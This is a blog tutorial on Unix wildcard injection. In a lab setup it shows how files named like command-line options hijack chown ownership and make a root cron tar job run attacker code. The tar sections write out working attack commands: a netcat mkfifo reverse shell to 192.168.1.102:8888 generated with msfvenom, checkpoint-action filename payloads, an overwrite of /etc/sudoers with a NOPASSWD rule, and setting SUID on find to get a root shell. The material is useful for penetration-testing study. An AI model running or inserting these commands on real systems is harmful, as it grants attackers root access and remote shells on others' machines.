<!DOCTYPE html><html lang="en-us"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><title>Exploiting Wildcard for Privilege Escalation - Sakibul Ali Khan</title><meta name="description" content="Exploiting Wildcard for Privilege Escalation In this article, we will cover “Wildcard Injection” an interesting old-school UNIX hacking technique, which is still a&hellip;"><meta name="generator" content="Publii Open-Source CMS for Static Site"><link rel="canonical" href="https://sakibulalikhan.github.io/blog/exploiting-wildcard-for-privilege-escalation.html"><link rel="amphtml" href="https://sakibulalikhan.github.io/blog/amp/exploiting-wildcard-for-privilege-escalation.html"><link rel="alternate" type="application/atom+xml" href="https://sakibulalikhan.github.io/blog/feed.xml"><link rel="alternate" type="application/json" href="https://sakibulalikhan.github.io/blog/feed.json"><meta property="og:title" content="Exploiting Wildcard for Privilege Escalation - Sakibul Ali Khan "><meta property="og:image" content="https://sakibulalikhan.github.io/blog/media/posts/6/prev-2.jpeg"><meta property="og:site_name" content="Sakibul Ali Khan"><meta property="og:description" content="Exploiting Wildcard for Privilege Escalation In this article, we will cover “Wildcard Injection” an interesting old-school UNIX hacking technique, which is still a&hellip;"><meta property="og:url" content="https://sakibulalikhan.github.io/blog/exploiting-wildcard-for-privilege-escalation.html"><meta property="og:type" content="article"><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@sakibulalikhan"><meta name="twitter:title" content="Exploiting Wildcard for Privilege Escalation - Sakibul Ali Khan "><meta name="twitter:description" content="Exploiting Wildcard for Privilege Escalation In this article, we will cover “Wildcard Injection” an interesting old-school UNIX hacking technique, which is still a&hellip;"><meta name="twitter:image" content="https://sakibulalikhan.github.io/blog/media/posts/6/prev-2.jpeg"><link rel="shortcut icon" href="https://sakibulalikhan.github.io/blog/media/website/pokemon.png" type="image/png"><style>:root{--primary-font:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Fira Sans","Droid Sans","Helvetica Neue",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol";--secondary-font:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Fira Sans","Droid Sans","Helvetica Neue",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"}</style><link rel="stylesheet" href="https://sakibulalikhan.github.io/blog/assets/css/fontawesome-all.min.css?v=dbf9d822cefe851ba6f66e1ad57e8987"><link rel="stylesheet" href="https://sakibulalikhan.github.io/blog/assets/css/style.css?v=45ed9e771a457477d01a62d6319c80cc"><noscript><link rel="stylesheet" href="https://sakibulalikhan.github.io/blog/assets/css/noscript.css?v=6228c7eee614cd200a2cad8333b439fa"></noscript><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://sakibulalikhan.github.io/blog/exploiting-wildcard-for-privilege-escalation.html"},"headline":"Exploiting Wildcard for Privilege Escalation","datePublished":"2022-01-10T21:26","dateModified":"2022-01-10T21:26","image":{"@type":"ImageObject","url":"https://sakibulalikhan.github.io/blog/media/posts/6/prev-2.jpeg","height":266,"width":474},"description":"Exploiting Wildcard for Privilege Escalation In this article, we will cover “Wildcard Injection” an interesting old-school UNIX hacking technique, which is still a&hellip;","author":{"@type":"Person","name":"Sakibul Ali Khan","url":"https://sakibulalikhan.github.io/blog/authors/sakibul-ali-khan/"},"publisher":{"@type":"Organization","name":"Sakibul Ali Khan"}}</script><style>#wrapper > .bg {
               background-image: url(https://sakibulalikhan.github.io/blog/assets/images/overlay.png), linear-gradient(0deg, rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1)), url(https://sakibulalikhan.github.io/blog/media/website/hero-bg.jpg);
           }</style></head><body class="is-preload"><div id="wrapper"><header id="header"><a class="logo" href="https://sakibulalikhan.github.io/blog/">Sakibul Ali Khan</a></header><nav id="nav"><ul class="links"><li><a href="https://sakibulalikhan.github.io/blog/" title="https://sakibulalikhan.github.io/" target="_self">Home</a></li><li><a href="https://sakibulalikhan.github.io/blog/tags/blog/" title="https://sakibulalikhan.github.io/blog" target="_self">Blog</a></li><li><a href="https://www.linkedin.com/in/sakibulalikhan/" title="https://sakibulalikhan.github.io/about-me" target="_blank">About Me</a></li></ul><ul class="icons"><li><a href="https://twitter.com/sakibulalikhan" class="icon brands fa-twitter"><span class="label">Twitter</span></a></li><li><a href="https://www.instagram.com/sakibulalikhan/" class="icon brands fa-instagram"><span class="label">Instagram</span></a></li><li><a href="https://www.linkedin.com/in/sakibulalikhan/" class="icon brands fa-linkedin"><span class="label">LinkedIn</span></a></li></ul></nav><main id="main"><article class="post"><header class="major"><time datetime="2022-01-10T21:26" class="date">January 10, 2022</time><h1>Exploiting Wildcard for Privilege Escalation</h1><p class="post__inner"></p></header><figure class="image main"><img src="https://sakibulalikhan.github.io/blog/media/posts/6/prev-2.jpeg" srcset="https://sakibulalikhan.github.io/blog/media/posts/6/responsive/prev-2-xs.jpeg 300w, https://sakibulalikhan.github.io/blog/media/posts/6/responsive/prev-2-sm.jpeg 480w, https://sakibulalikhan.github.io/blog/media/posts/6/responsive/prev-2-md.jpeg 768w, https://sakibulalikhan.github.io/blog/media/posts/6/responsive/prev-2-lg.jpeg 1024w, https://sakibulalikhan.github.io/blog/media/posts/6/responsive/prev-2-xl.jpeg 1360w" sizes="(max-width: 1360px) 100vw, 1360px" loading="lazy" height="266" width="474" alt="Wildcard for Privilege Escalation"><figcaption>Wildcard for Privilege Escalation</figcaption></figure><div class="post__inner post__entry"><h1 class="post-title entry-title">Exploiting Wildcard for Privilege Escalation</h1><div class="post-date"><figure class="post__image"><img loading="lazy" src="https://sakibulalikhan.github.io/blog/media/posts/6/prev.jpeg" sizes="(max-width: 48em) 100vw, 768px" srcset="https://sakibulalikhan.github.io/blog/media/posts/6/responsive/prev-xs.jpeg 300w, https://sakibulalikhan.github.io/blog/media/posts/6/responsive/prev-sm.jpeg 480w, https://sakibulalikhan.github.io/blog/media/posts/6/responsive/prev-md.jpeg 768w, https://sakibulalikhan.github.io/blog/media/posts/6/responsive/prev-lg.jpeg 1024w, https://sakibulalikhan.github.io/blog/media/posts/6/responsive/prev-xl.jpeg 1360w, https://sakibulalikhan.github.io/blog/media/posts/6/responsive/prev-2xl.jpeg 1600w" alt="Wildcard for Privilege Escalation" width="474" height="266"></figure></div><div class="content post-excerpt entry-content clearfix"><p>In this article, we will cover “Wildcard Injection” an interesting old-school UNIX hacking technique, which is still a successful approach for Post exploitation and even many security-related folks haven’t heard of it. Here you will get surprised after perceiving some UNIX tools like ‘tar’ or ‘chown’ can lead to full system compromise.</p><h3><strong>Table of content</strong></h3><ul><li>Introduction</li><li>Wildcard</li><li>Wildcard wildness example 1</li><li>File hijacking example 2</li><li>Post Exploitation via tar (Phase I)</li><li>Tar Wildcard Injection (1st method)</li><li>Post Exploitation via tar (Phase II)</li><li>Tar Wildcard Injection (1st method)</li><li>Tar Wildcard Injection (2nd method)</li><li>Tar Wildcard Injection (3rd method)</li></ul><p><strong>Let’s Start!!!</strong></p><h3><strong>Wildcard</strong></h3><p>The wildcard is a character or set of characters that can be used as a replacement for some range/class of characters. Wildcards are interpreted by the shell before any other action is taken.</p><p><strong>Some Wildcards character:</strong></p><p><strong>*</strong>     An asterisk matches any number of character in a filename, including none.</p><p><strong> ?</strong>     The question mark matches any single character.</p><p><strong>[ ]</strong>   Brackets enclose a set of characters, any one of which may match a single character at that position.</p><p> <strong>–  </strong>   A hyphen used within [ ] denotes a range of characters.</p><p><strong>~</strong>     A tilde at the beginning of a word expands to the name of your home directory. Append another user’s login name to the character, it refers to that user’s home directory.</p><p><strong>1<sup>st</sup> Example</strong></p><p>You might be aware of wildcard symbol and their traditional usage but here we are presenting wildcard wildness and for this, I would like to draw your attention to the below steps.</p><pre class="lang:default decode:true">cd /Desktop
mkdir wild
cd wild
echo "Hello Friends" &gt; file1
echo "This is Wildcard Injection" &gt; file2
echo "take help" &gt; --help</pre><p>So as you can observe, here we have made a new directory “wild” on the desktop then with help of the echo command we have created 3 files and written 1 line in each file.</p><figure class="jetpack-lazy-image jetpack-lazy-image--handled"><img loading="lazy" src="https://i0.wp.com/4.bp.blogspot.com/-aNOs6VHwEW4/Wy4yZSdnuyI/AAAAAAAAXek/4gsiqBUoScAe1vqzQ2i5PWd_2hUFfrfVACEwYBhgL/s1600/1.1.png?w=640" data-is-external-image="true" loading="eager" data-recalc-dims="1" data-lazy-loaded="1"></figure><p>Afterwards, with help of the cat command, we try to open all the above 3 files as shown:</p><pre class="lang:default decode:true">cat file1
cat file 2
cat --help</pre><p>However, the first two files opened normally and show the same information as written above. But the cat command failed to read information written inside –help file. Instead of showing “take help” while opening –help file it calls its own –help options from its own libraries &amp; such type of trick is called <strong>Wildcard wildness</strong>.</p><figure class="jetpack-lazy-image jetpack-lazy-image--handled"><img loading="lazy" src="https://i0.wp.com/1.bp.blogspot.com/-aEBHdou9cpU/Wy4yZvUHwVI/AAAAAAAAXgQ/sb4tiFcxRRM6RnAPxLPZtpMrCA1bnFX7QCEwYBhgL/s1600/1.2.png?w=640" data-is-external-image="true" loading="eager" data-recalc-dims="1" data-lazy-loaded="1"></figure><h3><strong>File owner hijacking via Chown</strong></h3><p>Similarly again we try to do something roguish with help of <strong>chown</strong> command. As we know it is an abbreviation of change owner, which is used on Unix-like systems to modify the ownership of file system files, directories and it may only be changed by a super-user. Let say we have three users in our system.</p><p>Super-user (<strong>root</strong>) – perform an admin-level task such as run <strong>chown</strong> command.</p><p>Non-root-user1 (<strong>raj</strong>) – perform ordinary jobs such as create file</p><p>Non-root-user2 (<strong>sak</strong>) – perform ordinary jobs such as create file</p><p>Mischief-user (<strong>Ignite</strong>) – perform a notorious task such as the <strong>Chown</strong> file reference trick that can lead to file owner hijacking.</p><p>In the following image, you can observe all the PHP file is owned by user: raj. Now when the user: ignite found all PHP file is own be user raj then he induces two PHP file himself in the same directory and uses file reference trick for file owner hijacking by executing below commands.</p><pre class="lang:default decode:true">ls -al
echo "" &gt; my.php
echo &gt; --reference=my.php</pre><figure class="jetpack-lazy-image jetpack-lazy-image--handled"><img loading="lazy" src="https://i1.wp.com/1.bp.blogspot.com/-9LX33vg4GDQ/Wy4yZkCeO6I/AAAAAAAAXgM/eI3TQ7LvuyQUSVsrVrmfwcNqn3Qqqok1wCEwYBhgL/s1600/1.3.png?w=640" data-is-external-image="true" loading="eager" data-recalc-dims="1" data-lazy-loaded="1"></figure><p>As you can notice, mostly file is owned by user: raj and the last two files are owned by user: ignite and when the super-user will be supposed to change ownership of all file having PHP extension with help of wildcard, then all files will indirectly come under the ownership of user: ignite.</p><p>As you can observe when root user run chown command to give ownership to all the PHP files to the user: aarti, an error occurred and as result, the all PHP file get seized by user: ignite automatically.</p><pre class="lang:default decode:true">chown -R aarti:aarti *.php
ls -al</pre><p><strong>Conceptual Information:</strong></p><p>If you have ever explored tar to read its optional switches then you will find the following option.</p><p><strong>–reference=RFILE</strong> (use RFILE’s owner and group rather than specifying OWNER: GROUP values)</p><p>In our case user: ignite executed the following commands:</p><pre class="lang:default decode:true">echo "" &gt; my.php
echo &gt; --reference=my.php</pre><p>Then root user takes the help of the wildcard character for changing ownership. Thing is that the wildcard character used in ‘chown’ command line took the subjective ‘–reference=.my.php’ file and passed it to the chown command at the command line as an option.</p><figure class="jetpack-lazy-image jetpack-lazy-image--handled"><img loading="lazy" src="https://i1.wp.com/2.bp.blogspot.com/-b9cA7Ai6bxg/Wy4yaFRWkKI/AAAAAAAAXgY/V_Z8aGXCbXcTHruYX0oIsiWDlaQ_SEl4wCEwYBhgL/s1600/1.4.png?w=640" data-is-external-image="true" loading="eager" data-recalc-dims="1" data-lazy-loaded="1"></figure><h3><strong>Post Exploitation via tar (Phase I)</strong></h3><p><strong>Lab-Setup</strong></p><p>Likewise again we extend the wildness of wildcard character to the ultimate level and it was like a dynamic explosion in terms of system hacking.</p><p>Tar is a very common UNIX program for creating and extracting archives. And with help of it, we are going to take a compress backup of any directory. For example, make a new directory and give ALL permission to it and then create some files.</p><pre class="lang:default decode:true">mkdir html
chmod 777 html
cd html
touch index.html
touch raj
touch file.txt</pre><figure class="jetpack-lazy-image jetpack-lazy-image--handled"><img loading="lazy" src="https://i0.wp.com/1.bp.blogspot.com/-REcPJzmUnrw/Wy4yaJOjmwI/AAAAAAAAXf8/9kCdJ-Gw8rQ7RLVSMTbuYeXCp7MXWFZ7wCEwYBhgL/s1600/1.png?w=640" data-is-external-image="true" loading="eager" data-recalc-dims="1" data-lazy-loaded="1"></figure><p>Now schedule a task with help of crontab to run tar archival program for taking backup of /html from inside /var/backups in every 1 minute.</p><pre class="lang:default decode:true">nano /etc/crontab
*/1 *   * * *   root tar -zcf /var/backups/html.tgz /var/www/html/*</pre><figure class="jetpack-lazy-image jetpack-lazy-image--handled"><img loading="lazy" src="https://i1.wp.com/1.bp.blogspot.com/-AyxeBLgnxPc/Wy4ydPEeVgI/AAAAAAAAXgg/-vhBlyxEK5ESW2zZXnGjN1I8OIDLPcYaACEwYBhgL/s1600/2.png?w=640" data-is-external-image="true" loading="eager" data-recalc-dims="1" data-lazy-loaded="1"></figure><p>Let’s verify the schedule is working or not by executing the following command.</p><pre class="lang:default decode:true">cd /var/backup
ls</pre><figure class="jetpack-lazy-image jetpack-lazy-image--handled"><img loading="lazy" src="https://i0.wp.com/2.bp.blogspot.com/-Y6KPox2OEXA/Wy4ydSFKCfI/AAAAAAAAXgE/u34EpcYKHMIaIRSrT2DpKhnjGqQm50kYgCEwYBhgL/s1600/3.png?w=640" data-is-external-image="true" loading="eager" data-recalc-dims="1" data-lazy-loaded="1"></figure><h3><strong>Tar Wildcard Injection (1<sup>st</sup> method)</strong></h3><p><strong>Privilege Escalation</strong></p><p>Start your attacking machine and first compromise the target system and then move to the privilege escalation stage. Suppose I successfully login into the victim’s machine through ssh and access the non-root user terminal. Then open crontab to view if any job is scheduled.</p><pre class="lang:default decode:true">cat /etc/crontab</pre><p>Here we notice the target has scheduled a tar archival program for every 1 minute and we know that cron job runs as root. Let’s try to exploit.</p><figure class="jetpack-lazy-image jetpack-lazy-image--handled"><img loading="lazy" src="https://i2.wp.com/2.bp.blogspot.com/-ALzdcI0seL4/Wy4ydtsDN7I/AAAAAAAAXgU/ibH2NahxT-wyhNFtVbA73eIT1rCEjtAPQCEwYBhgL/s1600/4.png?w=640" data-is-external-image="true" loading="eager" data-recalc-dims="1" data-lazy-loaded="1"></figure><p>On a new terminal generate netcat reverse shell malicious code for achieving netcat reverse connection by using msfvenom and enter the following command for that.</p><pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.102 lport=8888 R</pre><p>Copy the generated payload and paste it inside the victim’s shell as described below.</p><p><strong>nc -lvp 8888</strong></p><figure class="jetpack-lazy-image jetpack-lazy-image--handled"><img loading="lazy" src="https://i0.wp.com/3.bp.blogspot.com/-_v2Z6h1mZtw/Wy4ydjM3BfI/AAAAAAAAXgQ/7tIEuYRSQPIbQPjv1FZCISd8-95eTRAqQCEwYBhgL/s1600/5.png?w=640" data-is-external-image="true" loading="eager" data-recalc-dims="1" data-lazy-loaded="1"></figure><p>Now paste the above-copied payload as described below and ran the following commands inside the victim’s tty shell.</p><pre class="lang:default decode:true">echo "mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0&lt;/tmp/lhennp | /bin/sh &gt;/tmp/lhennp 2&gt;&amp;1; rm /tmp/lhennp" &gt; shell.sh
echo "" &gt; "--checkpoint-action=exec=sh shell.sh"
echo "" &gt; --checkpoint=1
tar cf archive.tar *</pre><figure class="jetpack-lazy-image jetpack-lazy-image--handled"><img loading="lazy" src="https://i1.wp.com/3.bp.blogspot.com/-yzOiHOko1H0/Wy4yd8dYSvI/AAAAAAAAXgM/Bo-5d1FkUTgm3foqjZFfI0YE_7Z0jka_wCEwYBhgL/s1600/6.png?w=640" data-is-external-image="true" loading="eager" data-recalc-dims="1" data-lazy-loaded="1"></figure><p>The above commands help the tar command to run the file shell.sh after the first file is archived. Since the tar command is running as root due to crontab, this has the effect of spawning a netcat shell and sending it to the attack platform on port 8888. And if you go back to the terminal window where the listener was on, you will have victim’s reverse connection in after 1 minute.</p><pre class="lang:default decode:true">id
whoami</pre><p><strong>Conceptual Information:</strong></p><p>If you have ever explored tar to read its optional switches then you will find the following option.</p><p><strong>–checkpoint[=NUMBER] </strong>show progress messages every Numbers record (default 10)</p><p><strong>–checkpoint-action=ACTION </strong>execute ACTION on each checkpoint</p><p>There is a ‘–checkpoint-action’ option, that will specify the program which will be executed when the checkpoint is reached. Mainly, this permits us to run an arbitrary command. Hence Options ‘–checkpoint=1’ and ‘–checkpoint-action=exec=sh shell.sh’ are handed to the ‘tar’ program as command-line options.</p><figure class="jetpack-lazy-image jetpack-lazy-image--handled"><img loading="lazy" src="https://i2.wp.com/4.bp.blogspot.com/-f7RK3fLz7Wg/Wy4yeTLp10I/AAAAAAAAXgc/mLSgGGl97kAMbrY4L0pjaYdwVDHuIOGVACEwYBhgL/s1600/7.png?w=640" data-is-external-image="true" loading="eager" data-recalc-dims="1" data-lazy-loaded="1"></figure><h3><strong>Post Exploitation via tar (Phase II)</strong></h3><p><strong>Lab Setup</strong></p><p>There are multiple ways to take compressed backup and multi techniques can also be applied for privilege escalation. In this phase, with help of tar, we are going to take a compress backup of a directory. For example, make a new directory whose backup you wish to take and give ALL permission to it and then create some files.</p><pre class="lang:default decode:true">cd /tmp
mkdir data
chmod 777 data
cd data
echo "" &gt; f1
echo "" &gt; f2
echo "" &gt; f3
ls</pre><figure class="jetpack-lazy-image jetpack-lazy-image--handled"><img loading="lazy" src="https://i1.wp.com/3.bp.blogspot.com/-2pISut2VhcU/Wy4yesWI4iI/AAAAAAAAXgU/wEDVMlubTSMnbDSzRRTVd_CMHqiXiQ8DACEwYBhgL/s1600/8.png?w=640" data-is-external-image="true" loading="eager" data-recalc-dims="1" data-lazy-loaded="1"></figure><p>Now in the other directory write a bash script for taking backup of /tmp/data with help of tar archive program.</p><pre class="lang:default decode:true">mkdir info
cd info
nano script.sh
chmod 777 script.sh</pre><figure class="jetpack-lazy-image jetpack-lazy-image--handled"><img loading="lazy" src="https://i2.wp.com/4.bp.blogspot.com/-tmCJCuvklv8/Wy4ye0om65I/AAAAAAAAXgU/JA-b7s6GQYEEGD5Yz5dqLTQCzb3ckQ8KACEwYBhgL/s1600/9.png?w=640" data-is-external-image="true" loading="eager" data-recalc-dims="1" data-lazy-loaded="1"></figure><pre class="lang:default decode:true">#!/bin/bash
cd /tmp/data
tar cf /info/backup.tgz *</pre><figure class="jetpack-lazy-image jetpack-lazy-image--handled"><img loading="lazy" src="https://i2.wp.com/2.bp.blogspot.com/-Z1IWZDv6Jvg/Wy4yaecZnuI/AAAAAAAAXgQ/LqowF9_7BNUA9H5iH8pSn_kact8q46W4QCEwYBhgL/s1600/10.png?w=640" data-is-external-image="true" loading="eager" data-recalc-dims="1" data-lazy-loaded="1"></figure><p>Now schedule a task with help of crontab to run tar archival program for taking backup of /html inside /var/backups in every 1 minute.</p><pre class="lang:default decode:true">nano /etc/crontab                                   
*/1 *   * * *   root    /info/script.sh</pre><figure class="jetpack-lazy-image jetpack-lazy-image--handled"><img loading="lazy" src="https://i1.wp.com/4.bp.blogspot.com/-tMQZT2zqPNI/Wy4yao0uODI/AAAAAAAAXgE/yB1XYj9UYlg4s97aXnx6Gwe1irwE2NYrQCEwYBhgL/s1600/11.png?w=640" data-is-external-image="true" loading="eager" data-recalc-dims="1" data-lazy-loaded="1"></figure><p>And after 1 minute you will notice the backup.tgz file is generated inside the info directory.</p><figure class="jetpack-lazy-image jetpack-lazy-image--handled"><img loading="lazy" src="https://i1.wp.com/3.bp.blogspot.com/-i7oV74f4PmQ/Wy4ya67SSaI/AAAAAAAAXgE/MQsqZ2-6Z-0fWJWObJW2gC8cc1LpOneIgCEwYBhgL/s1600/12.png?w=640" data-is-external-image="true" loading="eager" data-recalc-dims="1" data-lazy-loaded="1"></figure><h3><strong>Tar Wildcard Injection</strong></h3><p><strong>Inject netcat </strong><strong>reverse</strong><strong> _shell </strong><strong> for Privilege Escalation</strong></p><p>Start your attacking machine and first compromise the target system and then move to the privilege escalation stage. Suppose I successfully login into the victim’s machine through ssh and access non-root user terminal. Then open crontab to view if any job is scheduled.</p><pre class="lang:default decode:true">cat /etc/crontab</pre><p>Here we notice the target has scheduled a bash program script for every 1 minute and we know that cron job runs as root. The minute attacker read the program written inside the script.sh, he can apply the tar wildcard injection.</p><figure class="jetpack-lazy-image jetpack-lazy-image--handled"><img loading="lazy" src="https://i0.wp.com/3.bp.blogspot.com/-MWto_BployQ/Wy4ybMF7sOI/AAAAAAAAXgE/T14QSmP99csxygcL6LoUhwoKxKHIh37OACEwYBhgL/s1600/13.png?w=640" data-is-external-image="true" loading="eager" data-recalc-dims="1" data-lazy-loaded="1"></figure><p>Again generate netcat reverse shell payload as done above.</p><figure class="jetpack-lazy-image jetpack-lazy-image--handled"><img loading="lazy" src="https://i2.wp.com/4.bp.blogspot.com/-wQDqcAvVluk/Wy4ybRkC68I/AAAAAAAAXf8/38-nzuIdz7E2CRSioN4oitFPYgY_THUwQCEwYBhgL/s1600/15.png?w=640" data-is-external-image="true" loading="eager" data-recalc-dims="1" data-lazy-loaded="1"></figure><p>And again repeat the above step as shown in the image.</p><figure class="jetpack-lazy-image jetpack-lazy-image--handled"><img loading="lazy" src="https://i1.wp.com/4.bp.blogspot.com/-M4dUJIQEPDI/Wy4ybjSXuUI/AAAAAAAAXgE/5cg-fe7u72c3oUnH6VEnvacJ_TSMi0ckACEwYBhgL/s1600/16.png?w=640" data-is-external-image="true" loading="eager" data-recalc-dims="1" data-lazy-loaded="1"></figure><p>Then get back to netcat shell for the victim’s reverse connection and you will notice after 1 minute you get victim’s netcat session.</p><pre class="lang:default decode:true">whoami
cd /root
pwd</pre><p>Hence, the target can be easily exploited if he makes a usage tar archive program either by scheduling a job via command or through bash script.</p><figure class="jetpack-lazy-image jetpack-lazy-image--handled"><img loading="lazy" src="https://i0.wp.com/3.bp.blogspot.com/-6SsWohfgoeo/Wy4ycMLz12I/AAAAAAAAXgA/xmDPABxMCLk4FQboAazab4IDYNqY6T_pgCEwYBhgL/s1600/17.png?w=640" data-is-external-image="true" loading="eager" data-recalc-dims="1" data-lazy-loaded="1"></figure><h3><strong>Tar Wildcard Injection (2<sup>nd</sup> method)</strong></h3><p><strong>Exploit Sudoers file for Privilege Escalation</strong></p><p>Basically, with help wildcard injection an attack wants to gain the highest privilege of the system, therefore, he will try to inject some malicious code with help of tar for root access. But there are multiple ways to obtain root access and hence you can apply the following techniques for privilege escalation.</p><p>Suppose you have victim’s machine as a non-root user and for privilege escalation either take root access or try to give sudo right to non-root user by adding him sudoers file. Thus you can take help of following commands.</p><pre class="lang:default decode:true">echo 'echo "ignite ALL=(root) NOPASSWD: ALL" &gt; /etc/sudoers' &gt; demo.sh
echo "" &gt; "--checkpoint-action=exec=sh demo.sh"
echo "" &gt; --checkpoint=1
tar cf archive.tar *</pre><p>With the help of above command we had tried to give root permission to the user: ignite and for 1 minute. After 1 minute passed we successfully owned the root account.</p><pre class="lang:default decode:true">sudo -l
sudo bash
whoami</pre><figure class="jetpack-lazy-image jetpack-lazy-image--handled"><img loading="lazy" src="https://i2.wp.com/1.bp.blogspot.com/-uPMOZswJTjg/Wy4yc5Fff9I/AAAAAAAAXgU/ccFKOiLDy50HwETU1EtQ8u2g5ACOFMLFACEwYBhgL/s1600/18.png?w=640" data-is-external-image="true" loading="eager" data-recalc-dims="1" data-lazy-loaded="1"></figure><h3><strong>Tar Wildcard Injection (3<sup>rd</sup> method)</strong></h3><p><strong>Privilege Escalation-Give SUID permission to system binaries</strong></p><p>There are multiple ways for privilege escalation with help of tar injection but we are discussing very few methods among them. Suppose you have victim’s machine as the non-root user and for privilege escalation, you can try to enable SUID bit for any system binaries and likewise above again you can take help of the following command for obtaining root access.</p><pre class="lang:default decode:true">echo "chmod u+s /usr/bin/find" &gt; test.sh
echo "" &gt; "--checkpoint-action=exec=sh test.sh"
echo "" &gt; --checkpoint=1
tar cf archive.tar *
ls -al /usr/bin/find
find f1 -exec "whoami" \;
root
find f1 -exec "/bin/sh" \;
id
whoami</pre><p>We Hope, you people will enjoy these tricks while penetration testing.</p><figure class="jetpack-lazy-image jetpack-lazy-image--handled"><img loading="lazy" src="https://i0.wp.com/3.bp.blogspot.com/-O2lhkg-YydQ/Wy4yc4FoSkI/AAAAAAAAXgE/LHf2Z4NL9EgDQfHc5GdPAq8PNHUq3d76QCEwYBhgL/s1600/19.png?w=640" data-is-external-image="true" loading="eager" data-recalc-dims="1" data-lazy-loaded="1"></figure><p><strong>Source: </strong>//www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt</p></div></div><footer class="post__inner post__footer"><p class="post__last-updated">This article was updated on January 10, 2022</p><div class="post__share-tag-container"><div class="post__tag"><h3>Tagged in:</h3><ul><li><a href="https://sakibulalikhan.github.io/blog/tags/blog/">Blog</a></li><li><a href="https://sakibulalikhan.github.io/blog/tags/linux/">Linux</a></li><li><a href="https://sakibulalikhan.github.io/blog/tags/linux-privilege-escalation/">Linux Privilege Escalation</a></li></ul></div><div class="post__share"><button class="post__share-button js-post__share-button icon" aria-label="Share button"><i class="fas fa-share-alt"></i></button><div class="post__share-popup js-post__share-popup"><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsakibulalikhan.github.io%2Fblog%2Fexploiting-wildcard-for-privilege-escalation.html" class="js-share icon brands fa-facebook-f" rel="nofollow noopener noreferrer"><span class="label">Facebook</span> </a><a href="https://twitter.com/share?url=https%3A%2F%2Fsakibulalikhan.github.io%2Fblog%2Fexploiting-wildcard-for-privilege-escalation.html&amp;via=%40sakibulalikhan&amp;text=Exploiting%20Wildcard%20for%20Privilege%20Escalation" class="js-share icon brands fa-twitter" rel="nofollow noopener noreferrer"><span class="label">Twitter</span> </a><a href="https://pinterest.com/pin/create/button/?url=https%3A%2F%2Fsakibulalikhan.github.io%2Fblog%2Fexploiting-wildcard-for-privilege-escalation.html&amp;media=https%3A%2F%2Fsakibulalikhan.github.io%2Fblog%2Fmedia%2Fposts%2F6%2Fprev-2.jpeg&amp;description=Exploiting%20Wildcard%20for%20Privilege%20Escalation" class="js-share icon brands fa-pinterest" rel="nofollow noopener noreferrer"><span class="label">Pinterest</span> </a><a href="https://mix.com/add?url=https%3A%2F%2Fsakibulalikhan.github.io%2Fblog%2Fexploiting-wildcard-for-privilege-escalation.html" class="js-share icon brands fa-mix" rel="nofollow noopener noreferrer"><span class="label">Mix</span> </a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fsakibulalikhan.github.io%2Fblog%2Fexploiting-wildcard-for-privilege-escalation.html" class="js-share icon brands fa-linkedin" rel="nofollow noopener noreferrer"><span class="label">LinkedIn</span> </a><a href="https://buffer.com/add?text=Exploiting%20Wildcard%20for%20Privilege%20Escalation&amp;url=https%3A%2F%2Fsakibulalikhan.github.io%2Fblog%2Fexploiting-wildcard-for-privilege-escalation.html" class="js-share icon brands fa-buffer" rel="nofollow noopener noreferrer"><span class="label">Buffer</span> </a><a href="https://api.whatsapp.com/send?text=Exploiting%20Wildcard%20for%20Privilege%20Escalation https%3A%2F%2Fsakibulalikhan.github.io%2Fblog%2Fexploiting-wildcard-for-privilege-escalation.html" class="js-share icon brands fa-whatsapp" rel="nofollow noopener noreferrer"><span class="label">WhatsApp</span></a></div></div></div><div class="post__bio"><div><h3><a href="https://sakibulalikhan.github.io/blog/authors/sakibul-ali-khan/" class="invert" rel="author">Sakibul Ali Khan</a></h3></div></div></footer></article><div class="comments"><div class="post__inner"><h2>Comments</h2><div id="disqus_thread"></div><script>var disqus_config = function () {
                       this.page.url = 'https://sakibulalikhan.github.io/blog/exploiting-wildcard-for-privilege-escalation.html';
                       this.page.identifier = '6';
                   };
                   var disqus_element_to_check = document.getElementById('disqus_thread');
               
                   if ('IntersectionObserver' in window) {
                       var iObserver = new IntersectionObserver(
                           (entries, observer) => {
                               entries.forEach(entry => {
                                   if (entry.intersectionRatio >= 0.1) {
                                       (function () {
                                           var d = document, s = d.createElement('script');
                                           s.src = 'https://'+'sakibulalikhan-github-io'.trim()+'.disqus.com/embed.js';
                                           s.setAttribute('data-timestamp', +new Date());
                                           (d.head || d.body).appendChild(s);
                                       })();
                                       observer.unobserve(entry.target);
                                   }
                               });
                           },
                           {
                               threshold: [0, 1]
                           }
                       );
               
                       iObserver.observe(disqus_element_to_check);
                   } else {
                       (function () {
                           var d = document, s = d.createElement('script');
                           s.src = 'https://'+'sakibulalikhan-github-io'.trim()+'.disqus.com/embed.js';
                           s.setAttribute('data-timestamp', +new Date());
                           (d.head || d.body).appendChild(s);
                       })();
